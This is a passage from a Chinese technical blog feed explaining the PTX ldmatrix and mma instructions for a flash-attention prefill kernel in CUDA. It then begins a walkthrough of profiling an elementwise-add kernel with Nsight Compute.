<code>ldmatrix.sync.aligned.m8n8.x4.shared.b16 &#123;%0, %1, %2, %3&#125;, [%4];</code>，情况略有不同，因为这里会一次性读入 4 个 m8n8 的矩阵，所以对应的每个 thread 也需要 4 个寄存器来存放矩阵数据，%0 存放第一个 m8n8 的对应数值，%1 存放第二个，以此类推。</p><hr><p>初步认识好这条 PTX 指令后，又要如何在 CUDA C++ 中使用呢？我们可以使用 C++ 中 <code>asm volatile</code> 指令来将 PTX 指令嵌入到 CUDA C++ 中。</p><p>参考使用 PTX 指令模板：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">__asm__ <span class="hljs-title">volatile</span> <span class="hljs-params">(<span class="hljs-string">&quot;汇编指令&quot;</span></span></span><br><span class="hljs-params"><span class="hljs-function">                 : <span class="hljs-string">&quot;输出操作数&quot;</span></span></span><br><span class="hljs-params"><span class="hljs-function">                 : <span class="hljs-string">&quot;输入操作数&quot;</span></span></span><br><span class="hljs-params"><span class="hljs-function">                 : <span class="hljs-string">&quot;clobber 列表&quot;</span>)</span></span>;<br></code></pre></td></tr></table></figure><p>可以写出如下宏指令或 <code>inline</code> 函数来帮助我们使用 PTX 指令</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> LDMATRIX_M8N8_X1(R0, addr) asm volatile(<span class="hljs-string">&quot;ldmatrix.sync.aligned.m8n8.x4.shared.b16 &#123;%0&#125;, [%1];\n&quot;</span> : <span class="hljs-string">&quot;=r&quot;</span>(R0) : <span class="hljs-string">&quot;r&quot;</span>(addr))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LDMATRIX_M8N8_X4(R0, R1, R2, R3, addr) asm volatile(<span class="hljs-string">&quot;ldmatrix.sync.aligned.m8n8.x4.shared.b16 &#123;%0, %1, %2, %3&#125;, [%4];\n&quot;</span> : <span class="hljs-string">&quot;=r&quot;</span>(R0), <span class="hljs-string">&quot;=r&quot;</span>(R1), <span class="hljs-string">&quot;=r&quot;</span>(R2), <span class="hljs-string">&quot;=r&quot;</span>(R3) : <span class="hljs-string">&quot;r&quot;</span>(addr))</span><br><br><span class="hljs-function"><span class="hljs-type">static</span> __device__ __forceinline__ <span class="hljs-type">void</span> <span class="hljs-title">ldmatrix_m8n8_x1</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> &amp;r0, <span class="hljs-type">uint64_t</span> addr)</span> </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;ldmatrix.sync.aligned.m8n8.x4.shared.b16 &#123;%0&#125;, [%1];\n&quot;</span> : <span class="hljs-string">&quot;=r&quot;</span>(r0) : <span class="hljs-string">&quot;r&quot;</span>(addr))</span></span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">static</span> __device__ __forceinline__ <span class="hljs-type">void</span> <span class="hljs-title">ldmatrix_m8n8_x4</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> &amp;r0, <span class="hljs-type">uint32_t</span> &amp;r1, <span class="hljs-type">uint32_t</span> &amp;r2, <span class="hljs-type">uint32_t</span> &amp;r3, <span class="hljs-type">uint64_t</span> addr)</span> </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;ldmatrix.sync.aligned.m8n8.x4.shared.b16 &#123;%0, %1, %2, %3&#125;, [%4];\n&quot;</span> :<span class="hljs-string">&quot;=r&quot;</span>(r0), <span class="hljs-string">&quot;=r&quot;</span>(r1), <span class="hljs-string">&quot;=r&quot;</span>(r2), <span class="hljs-string">&quot;=r&quot;</span>(r3) : <span class="hljs-string">&quot;r&quot;</span>(addr))</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="mma">mma</h2><p>指令格式：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">mma.sync.aligned.m8n8k4.alayout.blayout.dtype.f16.f16.ctype  d, a, b, c;<br>mma.sync.aligned.m16n8k8.row.col.dtype.f16.f16.ctype  d, a, b, c;<br>mma.sync.aligned.m16n8k16.row.col.dtype.f16.f16.ctype d, a, b, c;<br><br><span class="hljs-string">.alayout</span> = &#123;<span class="hljs-string">.row</span>, <span class="hljs-string">.col</span>&#125;;<br><span class="hljs-string">.blayout</span> = &#123;<span class="hljs-string">.row</span>, <span class="hljs-string">.col</span>&#125;;<br><span class="hljs-string">.ctype</span>   = &#123;<span class="hljs-string">.f16</span>, <span class="hljs-string">.f32</span>&#125;;<br><span class="hljs-string">.dtype</span>   = &#123;<span class="hljs-string">.f16</span>, <span class="hljs-string">.f32</span>&#125;;<br><br><br>mma.sync.aligned.m16n8k4.row.col.f32.tf32.tf32.f32        d, a, b, c;<br>mma.sync.aligned.m16n8k8.row.col.f32.atype.btype.f32      d, a, b, c;<br>mma.sync.aligned.m16n8k16.row.col.f32.bf16.bf16.f32       d, a, b, c;<br>mma.sync.aligned.shape.row.col.dtype.f8type.f8type.ctype  d, a, b, c;<br>mma.sync.aligned.m16n8k32.row.col.kind.dtype.f8f6f4type.f8f6f4type.ctype d, a, b, c;<br><br><span class="hljs-string">.atype</span>      = &#123;<span class="hljs-string">.bf16</span>, <span class="hljs-string">.tf32</span>&#125;;<br><span class="hljs-string">.btype</span>      = &#123;<span class="hljs-string">.bf16</span>, <span class="hljs-string">.tf32</span>&#125;;<br><span class="hljs-string">.f8type</span>     = &#123;<span class="hljs-string">.e4m3</span>, <span class="hljs-string">.e5m2</span>&#125;;<br><span class="hljs-string">.f8f6f4type</span> = &#123;<span class="hljs-string">.e4m3</span>, <span class="hljs-string">.e5m2</span>, <span class="hljs-string">.e3m2</span>, <span class="hljs-string">.e2m3</span>, <span class="hljs-string">.e2m1</span>&#125;;<br><span class="hljs-string">.ctype</span>      = &#123;<span class="hljs-string">.f16</span>, <span class="hljs-string">.f32</span>&#125;;<br><span class="hljs-string">.dtype</span>      = &#123;<span class="hljs-string">.f16</span>, <span class="hljs-string">.f32</span>&#125;;<br><span class="hljs-string">.shape</span>      = &#123;<span class="hljs-string">.m16n8k16</span>, <span class="hljs-string">.m16n8k32</span>&#125;;<br><span class="hljs-string">.kind</span>       = &#123;<span class="hljs-string">.kind</span>:<span class="hljs-function">:f8f6f4</span>&#125;;<br></code></pre></td></tr></table></figure><p>mma 的指令格式要复杂得多，但功能都是一样的，实现 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi><mo>=</mo><mi>A</mi><mo>×</mo><mi>B</mi><mo>+</mo><mi>C</mi></mrow><annotation encoding="application/x-tex">D=A\times B+C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span>，结合 flash-attn 的要求，我们主要看一下这条指令：</p><p><code>mma.sync.aligned.m16n8k16.row.col.f16.f16.f16.f16 &#123;%0, %1&#125;, &#123;%2, %3, %4, %5&#125;, &#123;%6, %7&#125;, &#123;%8, %9&#125;;</code></p><p>mma m16n8k16 中，矩阵 A <code>MxK</code>，矩阵 B <code>KxN</code>，矩阵 C 和 D 都是 <code>MxN</code>，数据类型位 bf16。先来看矩阵 A 的 layout，它有16行16列，每个寄存器放2个元素：</p><p>其中 a0:a1 元素存放在 %2 寄存器内，a2:a3 元素存放在 %3 寄存器内，以此类推。</p><p><img src="https://docs.nvidia.com/cuda/parallel-thread-execution/_images/mma-16816-A-f16.png" alt=""></p><p>对于矩阵 B，它必须是列主序，16行8列的，矩阵 layout 是这样：</p><p><img src="https://docs.nvidia.com/cuda/parallel-thread-execution/_images/mma-16816-B-f16.png" alt=""></p><p>官方的图看上去有点抽象，我用 excel 画了一张图，一个方块代表一个数据元素。深色部分是一个 Warps 读取一次的部分，用白色加粗的字体写明了每个线程加载的方块元素。</p><p><img src="/img/LLM/m16n8k16.png" alt=""></p><p>Warps 会分四次把矩阵 A load 完成，与此同时还会把矩阵 B 分两次 load 完成，最后完成矩阵计算。</p><p>同样地，可以写出如下宏指令或 <code>inline</code> 函数来帮助我们使用 PTX 指令</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MMA_M16N8K16_FP16(RD0, RD1, RA0, RA1, RA2, RA3, RB0, RB1, RC0, RC1) asm volatile(<span class="hljs-string">&quot;mma.sync.aligned.m16n8k16.row.col.f16.f16.f16.f16 &#123;%0, %1&#125;, &#123;%2, %3, %4, %5&#125;, &#123;%6, %7&#125;, &#123;%8, %9&#125;;\n&quot;</span> : <span class="hljs-string">&quot;=r&quot;</span>(RD0), <span class="hljs-string">&quot;=r&quot;</span>(RD1) : <span class="hljs-string">&quot;r&quot;</span>(RA0), <span class="hljs-string">&quot;r&quot;</span>(RA1), <span class="hljs-string">&quot;r&quot;</span>(RA2), <span class="hljs-string">&quot;r&quot;</span>(RA3), <span class="hljs-string">&quot;r&quot;</span>(RB0), <span class="hljs-string">&quot;r&quot;</span>(RB1), <span class="hljs-string">&quot;r&quot;</span>(RC0), <span class="hljs-string">&quot;r&quot;</span>(RC1))</span><br><br><span class="hljs-function"><span class="hljs-type">static</span> __device__ __forceinline__ <span class="hljs-type">void</span> <span class="hljs-title">MMA_M16N8K16_FP16</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> &amp;rd0, <span class="hljs-type">uint32_t</span> &amp;rd1, <span class="hljs-type">uint32_t</span> ra0,  <span class="hljs-type">uint32_t</span> ra1,  <span class="hljs-type">uint32_t</span> ra2,  <span class="hljs-type">uint32_t</span> ra3, <span class="hljs-type">uint32_t</span> rb0,  <span class="hljs-type">uint32_t</span> rb1, <span class="hljs-type">uint32_t</span> rc0,  <span class="hljs-type">uint32_t</span> rc1)</span> </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;mma.sync.aligned.m16n8k16.row.col.f16.f16.f16.f16 &#123;%0, %1&#125;, &#123;%2, %3, %4, %5&#125;, &#123;%6, %7&#125;, &#123;%8, %9&#125;;\n&quot;</span> : <span class="hljs-string">&quot;=r&quot;</span>(rd0), <span class="hljs-string">&quot;=r&quot;</span>(rd1) : <span class="hljs-string">&quot;r&quot;</span>(ra0), <span class="hljs-string">&quot;r&quot;</span>(ra1), <span class="hljs-string">&quot;r&quot;</span>(ra2), <span class="hljs-string">&quot;r&quot;</span>(ra3), <span class="hljs-string">&quot;r&quot;</span>(rb0), <span class="hljs-string">&quot;r&quot;</span>(rb1), <span class="hljs-string">&quot;r&quot;</span>(rc0), <span class="hljs-string">&quot;r&quot;</span>(rc1))</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1>flash-attn 实现 prefill 阶段</h1><p>初步认识好 MMA 指令后，我们来看一下 flash-attn 要怎么用 MMA 指令来实现。</p><h2 id="问题分析">问题分析</h2><p>首先，需要明确 flash-attn 的输入输出，那么在很多大模型的 prefill 阶段，输入输出 Q K V O 张量的输入张量维度都是：<code>[batch_size, num_heads, seq_len, head_dim]</code>，我们为方便起见，简写成 <code>[b, h, sq, d]</code>。</p><p>另外，大多模型的 head_dim 维度都是固定为 128，因此我们优先考虑 d=128 的情况。</p><p>再来看计算过程。attention 的计算公式是：</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>attn</mtext><mo>=</mo><mtext>softmax</mtext><mo stretchy="false">(</mo><mfrac><mrow><mi>Q</mi><msup><mi>K</mi><mi>T</mi></msup></mrow><msqrt><mi>d</mi></msqrt></mfrac><mo stretchy="false">)</mo><mi>V</mi></mrow><annotation encoding="application/x-tex">\text{attn} = \text{softmax}(\frac{QK^T}{\sqrt{d}})V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord text"><span class="mord">attn</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.4483em;vertical-align:-0.93em;"></span><span class="mord text"><span class="mord">softmax</span></span><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.5183em;"><span style="top:-2.1778em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9322em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord" style="padding-left:0.833em;"><span class="mord mathnormal">d</span></span></span><span style="top:-2.8922em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.08em" viewBox="0 0 400000 1080" preserveAspectRatio="xMinYMin slice"><path d="M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221l0 -0c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47zM834 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1078em;"><span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">Q</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.93em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">)</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span></span></p><p>但这样的 QKV 张量实在是太大，不可能直接用一个 mma 就完成。对于四维张量，前面两维度是可以完全并行起来的，后面两维度才涉及到矩阵乘法。因此，可将前两个维度放到 GPU block 间做并行（即 grid size），反正他们完全可并行，不需要考虑这么多。</p><p>于是，我们得到了这样一张矩阵乘法图，首先计算 QK，得到矩阵 S，然后 S 与 V 相乘获得最后的结果 O（softmax 和 scale 等先略去）。</p><p><img src="/img/LLM/attn_slice1.png" alt=""></p><p>然而，这样的矩阵乘还是太大了，一个线程块都无法处理。我们需要进一步将矩阵切分，这里涉及到矩阵乘法时要如何切分的问题。对 M 和 N 方向切分还是对 K 方向切分？让我们回到实际问题，M 和 N 方向相当于是 seq_len 的长度，显然它是不确定的，它可能会非常长，也可能会非常短，而 K 方向的长度是一定的，我们只考虑 K=128 的情况，因此，我们选择在 M 和 N 方向切分，将不确定的长度切分成确定的大小，才有利于我们后续实现矩阵乘，否则 seq_len 要适配所有情况，难度太大。</p><p>那么我们现在一拍脑袋，先把 Seqlenq 和 Seqlenk 切分成等长 64 的吧（这些值的最有配置需要后续实现完成后 tune 一把，现在实现不考虑性能优劣）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">const</span> <span class="hljs-type">int</span> nrow = <span class="hljs-number">64</span>;<br></code></pre></td></tr></table></figure><p>切分完成后，我们终于可以让一个 CUDA 线程块来处理深色部分的区域了，得到的计算结果会填充到深绿色地方。</p><p><img src="/img/LLM/attn_slice2.png" alt=""></p><p>于是，让我们考虑一个线程块内的事情，由于 MMA 指令都是指挥一个 Warp 做事情，因此我们还需要考虑一个线程块内所有 Warp 要如何切分。</p><p>这里的关键在于 m16n8k16 的矩阵方块对应一个 Warp，需要用这个16行16列的颗粒度铺满整个矩阵 A，用16行8列颗粒度铺满矩阵 B，进而完成矩阵乘法计算。</p><p>在纸上画一下，使用 mma 分割方式只有一种，但用 Warp 分割的方式可以有很多种。比如说，我们假定一个线程块有 8 个 Warps，即 256 个线程，那么可以按下面任意方式将矩阵分成 8 份，每份由一个 Warp 来负责计算，每种 Warps 的切分实现的代码就会不一样。若再考虑到 block size 可以改变的话，实现的方案会更多，至于哪种性能最优，最简单的办法就是 tune 一遍看。</p><p><img src="/img/LLM/attn_slice3.png" alt=""></p><p>那么，我们就取图中第一种分割方法来实现 mma 吧。</p><h2 id="线程与数据的映射">线程与数据的映射</h2><p>写 CUDA 马虎不得，尤其是处理哪个线程对应处理哪块数据时更加马虎不得。我们仔细地按照上图第一种方式做切分。调用函数情况如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">dim3 <span class="hljs-title">gird</span><span class="hljs-params">(b*h, (sq+<span class="hljs-number">63</span>)/<span class="hljs-number">64</span>)</span></span>;<br><span class="hljs-function">dim3 <span class="hljs-title">block</span><span class="hljs-params">(<span class="hljs-number">256</span>)</span></span>;<br>flash_attn_fwd&lt;&lt;&lt;grid, block&gt;&gt;&gt;(Q, K, V, ...);<br></code></pre></td></tr></table></figure><p><img src="" alt="使用该图作参考"></p><p>假设我们已经拿到了 QKV 三个 global tensor 指针：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">half* Q;<br>half* K;<br>half* V;<br></code></pre></td></tr></table></figure><p>那么首先，要确定哪个线程块对应哪块数据，然后把他们的部分装到 shared memory，否则就在一开始就 load 错数据了。</p><p>考虑矩阵 Q，注意它是四维的，<code>[b, h, sq, d]</code>，所以寻址会非常复杂。我们之前说过，前两个维度是用 grid 切的 <code>grid(b*h, (sq+nrow)/nrow)</code>。</p><p>所以图中，矩阵 A 的一页大矩阵就是一个 <code>blockIdx.x</code> ，它将矩阵 A 切分成了 <code>b*h</code> 份，因而一个 <code>blockIdx.x</code> 对应的大小是 <code>sq*d</code>，所以这块的偏移量是：<code>blockIdx.x * sq * d</code>，然后再考虑 <code>blockIdx.y</code> 它用于寻址页内的block id 数，因此它对应的大小是 <code>64 * d</code>，所以这块偏移量是 <code>blockIdx.y * nrow * d</code>，那么总偏移量就是：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 对应一个深色块起始地址 Q</span><br><span class="hljs-type">int</span> Q_blk_gmem_offset = blockIdx.x * sq * d + blockIdx.y * nrow * d;<br></code></pre></td></tr></table></figure><p>对于 K 而言，也是一样的道理：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 对应一个深色块起始地址 K</span><br><span class="hljs-type">int</span> K_blk_gmem_offset = blockIdx.x * sq * d + blockIdx.y * nrow * d;<br></code></pre></td></tr></table></figure><p>然后要确认线程块内每个 Warp 负责区域的偏移量，要明确每个线程属于哪个 warp：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> warpid = threadIdx.x % <span class="hljs-number">32</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> mmaDimx = <span class="hljs-number">2</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> mmaDimy = <span class="hljs-number">2</span>;<br><span class="hljs-type">int</span> Q_warp_smem_offset = warpid / <span class="hljs-number">4</span> * mmaDimx * <span class="hljs-number">16</span> * d;<br><span class="hljs-type">int</span> K_warp_smem_offset = warpid % <span class="hljs-number">4</span> * mmaDimy * <span class="hljs-number">8</span> * d;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>AI</category>
      
      <category>Parallel Computing</category>
      
      <category>cuda</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AI</tag>
      
      <tag>cuda</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ncompute 学习与使用</title>
    <link href="/2025/02/03/2025-2-3-ncompute/"/>
    <url>/2025/02/03/2025-2-3-ncompute/</url>
    
    <content type="html"><![CDATA[<h1>ncompute 使用示例</h1><h2 id="准备工作">准备工作</h2><ul><li>机器设备：NVIDIA GeForce RTX 4060 laptop</li><li>CUDA 环境：12.4</li><li>docker 环境：<a href="http://nvcr.io/nvidia/pytorch:24.05-py3">nvcr.io/nvidia/pytorch:24.05-py3</a></li></ul><p>我简单地写了一个 elementwise 的 kernel 函数，并使用 <code>ncu</code> 对其做性能分析</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">__global__ <span class="hljs-type">void</span> <span class="hljs-title">elementwise_add_f32_kernel</span><span class="hljs-params">(<span class="hljs-type">float</span>* a, <span class="hljs-type">float</span>* b, <span class="hljs-type">float</span>* c, <span class="hljs-type">int</span> N)</span> </span>&#123;<br>  <span class="hljs-type">int</span> idx = blockIdx.x * blockDim.x + threadIdx.x;<br>  <span class="hljs-keyword">if</span> (idx &lt; N) c[idx] = a[idx] + b[idx];<br>&#125;<br><br><span class="hljs-comment">/* .. */</span><br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">2048</span> * <span class="hljs-number">4096</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> blockSize = <span class="hljs-number">256</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> numBlocks = (N + blockSize - <span class="hljs-number">1</span>) / blockSize;<br>elementwise_add_f32_kernel&lt;&lt;&lt;numBlocks, blockSize&gt;&gt;&gt;(d_a, d_b, d_c, N);<br></code></pre></td></tr></table></figure><p>用如下命令编译并执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nvcc -O3 ut.cu -std=c++17<br>ncu a.out<br></code></pre></td></tr></table></figure><p>就可以获得 ncompute 的相关性能数据输出。这篇文章中，我们从这些性能数据出发，尝试寻找一个适配于当前环境的最佳性能实践。</p><h2 id="性能数据一览">性能数据一览</h2><h3 id="elementwise-add-f32-kernel">elementwise_add_f32_kernel</h3><p><img src="/img/LLM/ncompute/elementwise_add_f32_kernel.png" alt=""></p><p>我们从上往下看，注意到在 Section: GPU Speed Of Light Throughput 中：</p><ul><li>表示内存数据传输吞吐量的 Memory Throughput 高达 95.27%</li><li>而计算的吞吐量（Compute (SM) Throughput）仅有 9.06%。</li></ul><p>注意，这可不是说明内存数据传输的利用率高，计算的利用率低。恰恰相反，这是说明该 kernel 函数的性能瓶颈在内存数据搬运上。因此我们后续要针对该 kernel 作性能优化，必须先从优化数据 load 开始。</p><p>再来看下一节表格的数据 Section: Launch Statistics。这个表格主要介绍了 kernel 启动时的统计数据。我们重点看下面的数据：</p><ul><li>Waves Per SM: 227.56</li><li>SMs: 24</li><li>Block Size: 256</li><li>Grid Size: 32768</li><li>Threads: 8388608</li><li>Registers Per Thread: 16</li><li>Shared Memory: 16.38 KB</li><li>Warps = 32 个 threads</li></ul><p>这些数字与我们调用的线程数量和设备中的 SM 数息息相关。首先，在软件层面，我们使用 cuda 调用 (32768, 256)=8388608 个线程来执行 <code>elementwise_add_f32_kernel</code> 函数。</p><p>而 device 中其实仅有 24 个 SMs，无法同时启动这么多线程来执行 kernel 函数。于是，device 必须多次循环使用这 24 个 SMs，来完成多线程的“并行”计算，一次循环在 CUDA 中被称之为 wave，<code>waves per SM</code> 记录了为了完成这个 kernel 函数，每个 SM 平均执行了多少个 waves。</p><p>那么一个 SM 可以执行多少个线程呢？这个取决于每个线程消耗了多少资源。因为一个 SM 中的资源都是固定的，这都是在芯片出厂后就确定下来的，无法随意改变。因此，每个线程消耗的资源多，那么一个 SM 可以同时执行的线程数量就少，反之则 SM 可以同时执行更多的线程。</p><p>一个 SM 可以执行多少个线程需要从下面的 Section: Occupancy 得出：</p><ul><li>Block Limit SM：24 blocks</li><li>Block Limit Registers：16 blocks</li><li>Block Limit Shared Mem：16 blocks</li><li>Block Limit Warps：6 blocks</li><li>Theoretical Active Warps per SM：48 warps</li></ul><p>从上面的数据可以得到：若从 SM 角度看，由于设备限制，每个 SM 最多可激活 24 个 blocks，所以此处 <code>Block Limit SM</code> 是 24；若从 Registers 角度看，由于设备限制，每个 SM 最多可激活 16 个 blocks，所以此处 <code>Block Limit Registers</code> 是 16；若从 Shared Mem 角度看，由于设备限制，每个 SM 最多可激活 16 个 blocks，所以此处 <code>Block Limit Shared Mem</code> 是 16；若从 Warps 角度看，由于设备限制，每个 SM 最多可激活 6 个 blocks，所以此处 <code>Block Limit Warps</code> 是 6。</p><p>为了满足所有资源的可用，我们必须取上面几个 limit 里的最小值，我们可以得到一个 SM 最多只能启动 6 个 blocks，而先前我们规定一个 block 有 256 个线程，即 8 个 warps，所以说，一个 SM 最多可以启动 6 * 8 = 48 个 warps，正好对应了 <code>Theoretical Active Warps per SM</code>。</p><p>更进一步，我们可以发现，因为一个 SM 最多可以启动 48 个 warps，即 48 * 32 = 1536 个线程，那么 24 个 SMs 可以启动 1536 * 24 = 36864 个线程，而我们总共需要启动 8388608 个线程，所以一共需要 8388608 / 36864 = 227.56 个 waves 来完成，也能正好对应 <code>Waves Per SM</code>。</p><p>当然，前面的分析都只是理论计算，ncompute 中还定义了占用率这个概念：</p><blockquote><p>占用率(Occupancy) = 每个 SM 中激活的 Warp / 每个 SM 可以激活的 Warp 的最大值。</p></blockquote><p>在本例中，理论上每个 SM 可以启动 48 个 Warps，但实际激活的 warps 数只有 38.98，于是占用率为 81.20%。</p><h3 id="elementwise-add-f32x4-kernel">elementwise_add_f32x4_kernel</h3><p>从上面的数据中可以看出，</p><ol><li>kernel 函数的性能瓶颈在内存数据搬运上。因此需要充分利用内存带宽。</li><li>线程块分配得过大，线程数量过多，进而导致 wave 数量过多。</li></ol><p>优化的点在于 CUDA 的访存行为上。在 CUDA 内部，一个访问内存事务（transaction）会消耗 128 bit 的内存带宽，而 <code>elementwise_add_f32_kernel</code> 函数中一次仅 load 一个 32 bit 的 float。</p><p>我们可以写一个让线程一次性 load 4 个元素的程序，增加内存访问事务的利用率。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 